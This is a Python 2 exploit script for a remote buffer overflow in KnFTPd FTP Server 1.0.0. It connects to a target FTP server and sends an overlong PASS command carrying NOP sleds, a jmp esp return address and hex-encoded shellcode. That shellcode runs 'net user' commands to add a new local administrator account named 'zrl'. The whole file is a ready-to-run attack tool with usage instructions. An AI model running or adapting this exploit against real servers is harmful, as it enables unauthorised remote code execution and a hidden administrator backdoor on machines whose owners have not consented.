#  !/usr/bin/python
#  KnFTPd FTP Server v1.0.0 Multiple Command Remote Buffer Overflow Exploit
#  Software Link: http://sourceforge.net/projects/knftp/files/KnFTPd/1.0.0/
#  Affected Version:1.0.0
#  Affected Command:
#  "USER","PASS","REIN","QUIT","PORT","PASV","TYPE","STRU",
#  "MODE","RETR","STOR","APPE","ALLO","REST","RNFR","RNTO",
#  "ABOR","DELE","CWD","LIST","NLST","SITE","STST","HELP",
#  "NOOP","MKD","RMD","PWD","CDUP","STOU","SNMT","SYST","XPWD"
# #  Vulnerability Discovered by Qixu Liu of NCNIPC (liuqx@nipc.org.cn)
#  Date: 02/09/2011
#  Thanks to: Zhejun Fang, Cheng Luo
#  Tested on: Windows XP SP3 Chinese (zh-cn)
#  Shellcode: Exploiting "PASS" Command to add a new system user "zrl:123456"

from struct import pack
import socket,sys
import os

if len(sys.argv) != 3:
    print "Usage: knftpd_exploit.py [IP] [PORT]"
    sys.exit(1)

target = sys.argv[1]
port = int(sys.argv[2])

shellcode=           "\x33\xdb\xb7\x02\x2b\xe3"
shellcode+= "\xeb\x1b\x5b\x31\xc0\x50\x31\xc0\x88\x43\x5d\x53\xbb\xad\x23\x86\x7c"
shellcode+= "\xff\xd3\x31\xc0\x50\xbb\xfa\xca\x81\x7c\xff\xd3\xe8\xe0\xff\xff\xff"
shellcode+= "\x63\x6d\x64\x2e\x65\x78\x65\x20\x2f\x63\x20\x6e\x65\x74\x20\x75\x73"
shellcode+= "\x65\x72\x20\x7a\x72\x6c\x20\x31\x32\x33\x34\x35\x36\x20\x2f\x61\x64"
shellcode+= "\x64\x20\x26\x26\x20\x6e\x65\x74\x20\x6c\x6f\x63\x61\x6c\x67\x72\x6f"
shellcode+= "\x75\x70\x20\x41\x64\x6d\x69\x6e\x69\x73\x74\x72\x61\x74\x6f\x72\x73"
shellcode+= "\x20\x2f\x61\x64\x64\x20\x7a\x72\x6c\x20\x26\x26\x20\x6e\x65\x74\x20"
shellcode+=          "\x75\x73\x65\x72\x20\x7a\x72\x6c"

eip ="\x12\x45\xfa\x7f" #jmp esp
eip += "\x90"*8
eip += "\xe9\x06\xff\xff\xff"
nops = "\x90" * 157

payload = "\x90" * 57 + shellcode + "\x90" * 94 +eip

print "[+] Connecting to Target " + target + "..."
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    connect=s.connect((target, port))
    print "[+] Target FTP Connected!"
except:
    print "[!] FTP didn't respond\n"
    sys.exit(0)

s.send('USER test \r\n')
s.recv(1024)

print "[+] Sending payload...length " +str(len(payload))
s.send('PASS ' + payload +' \r\n')
s.recv(1024)

print "[!] Exploit has been sent!. Please check the new user 'zrl'\n"
s.close()

